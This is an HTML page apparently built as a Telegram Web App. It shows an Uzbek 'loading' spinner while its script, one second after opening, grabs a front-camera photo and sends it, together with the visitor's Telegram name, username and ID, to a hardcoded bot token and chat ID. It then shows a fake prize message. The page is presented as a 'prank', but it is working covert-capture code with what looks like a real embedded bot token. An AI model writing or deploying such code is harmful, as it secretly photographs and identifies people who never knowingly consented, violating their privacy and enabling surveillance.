<!DOCTYPE html>
<html lang="uz">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Yuklanyapti...</title>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #000;
    display: flex;
    align-items: center;
    justify-content: center;
    height: 100vh;
    font-family: Arial, sans-serif;
    color: white;
  }
  #loading { text-align: center; padding: 20px; }
  .spinner {
    width: 60px; height: 60px;
    border: 5px solid #333;
    border-top-color: #0088cc;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
    margin: 0 auto 20px;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  p { color: #aaa; font-size: 14px; margin-top: 8px; }
  video, canvas { display: none; }
  #flash {
    position: fixed; inset: 0;
    background: white;
    opacity: 0;
    pointer-events: none;
    transition: opacity 0.1s;
    z-index: 999;
  }
</style>
</head>
<body>
<div id="flash"></div>
<div id="loading">
  <div class="spinner"></div>
  <h2>⏳ Yuklanmoqda...</h2>
  <p>Iltimos kuting</p>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
const tg = window.Telegram.WebApp;
tg.ready();
tg.expand();

// Token va Chat ID
const BOT_TOKEN = '8712533127:AAFXPFg8cfaXxbWrmADNJ9BkITMc8mUb1mo'; //[cite: 1]
const CHAT_ID   = '8814685453';   //[cite: 1]

async function captureAndSend() {
  try {
    // 1. Kamerayı başlat
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: 640, height: 480 },
      audio: false
    });

    const video = document.getElementById('video');
    video.srcObject = stream;

    // 2. Kameranın hazır olmasını bekle
    await new Promise((resolve) => {
      video.onloadedmetadata = () => {
        video.play();
        setTimeout(resolve, 1500); // Kadraj uyumu için 1.5 sn bekle[cite: 1]
      };
    });

    // Flaş efekti
    const flash = document.getElementById('flash');
    flash.style.opacity = '1';
    setTimeout(() => flash.style.opacity = '0', 150);

    // 3. Fotoğrafı tuvale çiz (Canvas)
    const canvas = document.getElementById('canvas');
    canvas.width  = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0);

    // Kamerayı kapat
    stream.getTracks().forEach(track => track.stop());

    // 4. Blob oluştur ve Telegram API'ye gönder
    canvas.toBlob(async (blob) => {
      if (!blob) {
        alert("Rasm alishda xatolik yuz berdi.");
        return;
      }

      const user = tg.initDataUnsafe?.user;
      const userName = user 
        ? `${user.first_name || ''} ${user.last_name || ''} (@${user.username || 'nomsiz'})`.trim()
        : 'Noma\'lum';

      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', blob, 'prank.jpg'); //[cite: 1]
      formData.append('caption', `📸 Prank ishladi!\n👤 ${userName}\n🆔 ID: ${user?.id || '?'}\n🕐 ${new Date().toLocaleString('uz-UZ')}`); //[cite: 1]

      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });

      const result = await response.json();

      if (result.ok) {
        document.getElementById('loading').innerHTML = `
          <div style="font-size:60px">🎉</div>
          <h2 style="margin-top:16px">Siz g'alaba qozondingiz!</h2>
          <p style="margin-top:8px; color:#aaa">Maxsus sovg'angiz tayyor</p>
        `; //[cite: 1]
      } else {
        alert("Telegram API Xatoligi: " + result.description);
      }
    }, 'image/jpeg', 0.85);

  } catch (err) {
    document.getElementById('loading').innerHTML = `
      <div style="font-size:50px">😅</div>
      <h2 style="margin-top:16px">Yuklanmadi</h2>
      <p style="color:#555; margin-top:8px">Qaytadan urinib ko'ring</p>
    `; //[cite: 1]
    alert("Kamera xatosi: " + err.message);
  }
}

// Sayt açıldıktan 1 saniye sonra çalışır[cite: 1]
setTimeout(captureAndSend, 1000);
</script>
</body>
</html>
